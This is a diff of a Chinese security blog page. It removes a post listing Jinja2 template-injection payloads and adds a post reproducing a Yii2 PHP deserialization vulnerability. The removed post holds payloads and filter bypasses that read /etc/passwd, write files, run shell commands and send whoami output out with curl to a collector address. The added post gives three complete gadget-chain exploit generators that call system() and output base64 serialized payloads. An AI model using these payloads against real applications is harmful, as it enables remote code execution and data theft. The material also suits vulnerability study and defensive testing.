@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="SSTI模板注入payload记录, Fortheone">
+    <meta name="keywords" content="Yii2反序列化漏洞复现学习, Fortheone">
     <meta name="description" content>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SSTI模板注入payload记录 | Fortheone</title>
+    <title>Yii2反序列化漏洞复现学习 | Fortheone</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -281,12 +281,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SSTI模板注入payload记录</h1>
+                    <h1 class="description center-align post-title">Yii2反序列化漏洞复现学习</h1>
                 </div>
             </div>
         </div>
@@ -424,7 +424,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-01-03
+                    2020-09-22
                 </div>
                 
 
@@ -433,7 +433,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    756
+                    741
                 </div>
                 
 
@@ -456,90 +456,178 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/ctfjennie1.jpg" width="80%">
-<a id="more"></a>
-<h3 id="0x00前言">0x00前言</h3>
-<p>模板注入也算比较老的东西了，但是偶尔可能会碰到，所以就在这里记录一些bypass方法和一些特殊的payload。</p>
-<p>基本的魔术方法</p>
-<pre><code>__class__  返回类型所属的对象
-__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
-__base__   返回该对象所继承的基类
-// __base__和__mro__都是用来寻找基类的
+                <h3 id="前言">前言</h3>
+<p>有段时间没写文章了，也有段时间没分析php的漏洞了，对php框架都有点生疏了，这次刚好爆出了Yii2反序列化的漏洞，跟着复现分析一下。</p>
+<h3 id="环境搭建">环境搭建</h3>
+<p><a href="https://github.com/yiisoft/yii2/releases" target="_blank" rel="noopener">https://github.com/yiisoft/yii2/releases</a></p>
+<p>直接在github上下载源码，那个basic-app，在目录下执行 <code>php yii serve --port=8888</code></p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200922102537.png" alt></p>
+<p>访问http://localhost:8888/出现这个页面代表成功了。</p>
+<h3 id="反序列化链寻找">反序列化链寻找</h3>
+<h4 id="1、BatchQueryResult起点">1、BatchQueryResult起点</h4>
+<p>首先是最多人披露的这一个反序列化起点</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200922102745.png" alt></p>
+<p>__destruct 后执行 reset方法，其中 _dataReader可控，现在就是找某个类的close方法，或是call方法。看了几个close方法，最后还是要通过call方法来触发，所以就直接找call方法吧。</p>
+<p>__Generator__类</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200922103623.png" alt></p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200922103718.png" alt></p>
+<p>这里的call_user_func_array 虽然我们不能控制参数，但是可以控制方法，以数组的方式来执行方法。</p>
+<p>这里的formatter确定了是 close ，但是formatters是我们可以操控的，所以只要设置 formatters[‘close’]=array(‘类名’,‘方法’)，即可执行一个类的无参方法。这里膜一波大师傅们，我自己翻是翻了很久，但是师傅们直接用正则找到无参方法中含有call_user_func的类。</p>
+<p>rest\IndexAction类</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200922104453.png" alt></p>
+<p>两个参数都可控，那么可以直接命令执行，构造poc。</p>
+<pre><code>&lt;?php
+namespace yii\rest{
+    class CreateAction{
+        public $checkAccess;
+        public $id;
 
-__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
-__init__  类的初始化方法
-__globals__  对包含函数全局变量的字典的引用
+        public function __construct(){
+            $this-&gt;checkAccess = 'system';
+            $this-&gt;id = 'dir';
+        }
+    }
+}
+
+namespace Faker{
+    use yii\rest\CreateAction;
+
+    class Generator{
+        protected $formatters;
+
+        public function __construct(){
+            $this-&gt;formatters['close'] = [new CreateAction(), 'run'];
+        }
+    }
+}
+
+namespace yii\db{
+    use Faker\Generator;
+
+    class BatchQueryResult{
+        private $_dataReader;
+
+        public function __construct(){
+            $this-&gt;_dataReader = new Generator;
+        }
+    }
+}
+namespace{
+    echo base64_encode(serialize(new yii\db\BatchQueryResult));
+}
+?&gt;
 </code></pre>
-<h3 id="0x01常见的一些payload">0x01常见的一些payload</h3>
-<p>这里多数都是通过先获取到object对象，然后找到file引用来读取文件。</p>
-<pre><code>''.__class__.__mro__[2]
-{}.__class__.__bases__[0]
-().__class__.__bases__[0]
-[].__class__.__bases__[0]
-request.__class__.__mro__[8]    //(jinja2中存在request对象)
+<p>这里要注意命名空间的问题，不然会500。</p>
+<p>在控制器中加上一个反序列化的操作。在controllers目录下新建一个SerController.php，内容如下</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200922104933.png" alt></p>
+<p>Yii2的路由方式是 index.php?r=控制器名/方法名</p>
+<p>所以直接 index.php?r=ser/unser&amp;data=反序列化数据</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200922105646.png" alt></p>
+<h4 id="2、RunProcess起点">2、RunProcess起点</h4>
+<p>在Yii2.0.38中将上面BatchQueryResult添加了__wakeup方法，导致不能作为起点，但是直接搜</p>
+<p>__destruct还是能找到其他的起点的。</p>
+<p>RunProcess类</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200922111823.png" alt></p>
+<p>这里processes可控，还是可以用上一条链的后半部分。</p>
+<pre><code>&lt;?php
+namespace yii\rest{
+    class CreateAction{
+        public $checkAccess;
+        public $id;
+
+        public function __construct(){
+            $this-&gt;checkAccess = 'system';
+            $this-&gt;id = 'dir';
+        }
+    }
+}
+
+namespace Faker{
+    use yii\rest\CreateAction;
+
+    class Generator{
+        protected $formatters;
+
+        public function __construct(){
+            $this-&gt;formatters['isRunning'] = [new CreateAction(), 'run'];
+        }
+    }
+}
+
+
+namespace Codeception\Extension{
+    use Faker\Generator;
+    class RunProcess{
+        private $processes;
+        public function __construct()
+        {
+            $this-&gt;processes = [new Generator()];
+        }
+    }
+}
+namespace{
+    // 生成poc
+    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));
+}
+?&gt;
 </code></pre>
-<p>上面的语句都可以获得object对象，然后通过object对象列出可调用的引用列表，找到可用的引用。</p>
-<pre><code>object.__subclasses__()[40]('/etc/passwd').read()     //file类读取文件
-object.__subclasses__()[40]('/tmp').write('test')     //file类写文件
+<h4 id="3、Swift-KeyCache-DiskKeyCache起点">3、Swift_KeyCache_DiskKeyCache起点</h4>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200922135336.png" alt></p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200922135440.png" alt></p>
+<p>path可控，可以触发tostring方法。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200922135425.png" alt></p>
+<p>dom可控，可以触发call方法。</p>
+<pre><code>&lt;?php
+namespace yii\rest{
+    class CreateAction{
+        public $checkAccess;
+        public $id;
 
-object..__subclasses__()[59].__init__.func_globals['linecache'].os.system('whoami')     //os类执行命令
+        public function __construct(){
+            $this-&gt;checkAccess = 'system';
+            $this-&gt;id = 'dir';
+        }
+    }
+}
 
-object.__subclasses__()[59].__init__.func_globals['linecache'].os.popen('ls').read()      //os类执行命令
+namespace Faker{
+    use yii\rest\CreateAction;
 
-{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()                                        //os类执行命令              
+    class Generator{
+        protected $formatters;
+
+        public function __construct(){
+            $this-&gt;formatters['saveXML'] = [new CreateAction(), 'run'];
+        }
+    }
+}
+
+namespace Codeception\Util{
+    use Faker\Generator;
+
+    class XmlBuilder{
+        protected $__dom__;
+        public function __construct(){
+            $this-&gt;__dom__= new Generator();
+        }
+    }
+}
+namespace{
+    use Codeception\Util\XmlBuilder;
+    class Swift_KeyCache_DiskKeyCache{
+        private $path;
+        private $keys = [];
+        public function __construct(){
+            $this-&gt;path = new XmlBuilder();
+            $this-&gt;keys = array(
+                &quot;1&quot;=&gt;&quot;1&quot;
+            );
+        }
+    }
+
+    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache));
+}
 </code></pre>
-<h3 id="0x02-bypass">0x02 bypass</h3>
-<h4 id="1、过滤">1、过滤[</h4>
-<pre><code>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()                            //读文件
-
-''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()                //执行命令
-</code></pre>
-<h4 id="2、过滤引号">2、过滤引号</h4>
-<pre><code>{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() }}
-//先获取chr()函数，赋值给chr，然后用chr拼接出要读取的文件名
-
-
-().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&amp;path=/etc/passwd
-//要使用到request对象，在jinja2中可使用
-
-//执行命令
-{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
-
-
-().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&amp;cmd=id
-</code></pre>
-<h4 id="3、过滤双下划线">3、过滤双下划线</h4>
-<pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
-//也要用到request对象
-</code></pre>
-<h4 id="4、过滤大括号">4、过滤大括号</h4>
-<pre><code>{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
-//利用curl将结果外带
-```
-
-
-
-#### 5、过滤了class 或者 subclasses
-
-利用 'subcla'+'sses'绕过
-
-其他的字符串过滤了也可以使用这种拼接的方式绕过
-
-
-
-#### 其他的一些payload
-
-```
-().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()' )
-
-session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]         //可以获取到object对象，再根据序列号选择file或os类
-
-{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read() }}{% endif %}{% endfor %}
-
-</code></pre>
-<h3 id="0x03-参考文章">0x03 参考文章</h3>
-<p><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/120/</a></p>
-<p><a href="https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">https://evi0s.com/2018/11/26/%e6%b7%b1%e5%85%a5ssti-%e4%bb%8enctf2018%e4%b8%a4%e9%81%93flask%e7%9c%8bbypass%e6%96%b0%e5%a7%bf%e5%8a%bf/</a></p>
 
             </div>
             <hr>
@@ -565,7 +653,7 @@ session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]     
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/year/01/03/ssti/">http://yoursite.com/year/01/03/ssti/</a>
+                    <a href="http://yoursite.com/year/09/22/Yii2反序列化/">http://yoursite.com/year/09/22/Yii2反序列化/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1031,31 +1119,32 @@ session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]     
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/year/03/04/JavaScript/">
+                <a href="/year/09/22/Yii2反序列化/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="回炉重造计划——JavaScript学习小结">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="Yii2反序列化漏洞复现学习">
                         
-                        <span class="card-title">回炉重造计划——JavaScript学习小结</span>
+                        <span class="card-title">Yii2反序列化漏洞复现学习</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            JavaScript中的基础语法就不做记录了，大多数会在后面的漏洞分析中记录。
-0x00 JavaScript继承机制
-在JavaScript中，几乎所有的事物都是对象。
-创造对象的方法：
-var o = {a:1,b:2};       
+                            前言
+有段时间没写文章了，也有段时间没分析php的漏洞了，对php框架都有点生疏了，这次刚好爆出了Yii2反序列化的漏洞，跟着复现分析一下。
+环境搭建
+https://github.com/yiisoft/yii2/releases
+直接在
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-04
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-22
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1068,6 +1157,7 @@ var o = {a:1,b:2};
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1078,27 +1168,36 @@ var o = {a:1,b:2};
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/12/14/SWPUCTF/">
+                <a href="/year/08/26/强网杯writeup/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="SWPUCTF2019复现">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="强网杯writeup">
                         
-                        <span class="card-title">SWPUCTF2019复现</span>
+                        <span class="card-title">强网杯writeup</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SWPUCTF进行的时候刚好在打省赛，所以没有去做题目，只能赛后来看看题目，学习一点新姿势。
+                            一、战队信息
+战队名称：低级CTF团队
+战队排名：63
+二、解题情况
 
-0x00 web1
-web1是一个二次注入的题目，因为其中过滤了or，所以常用的information_schema就不能用了，但是可以用之前上
+三、解题过程
+强网先锋
+upload
+
+打开流量包发现上传了个图片文件，导出图片。
+根据图片名 steghide可以知道应该是steghide加密，但是不知道密码。
+
+
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-26
                             </span>
                         <span class="publish-author">
                             
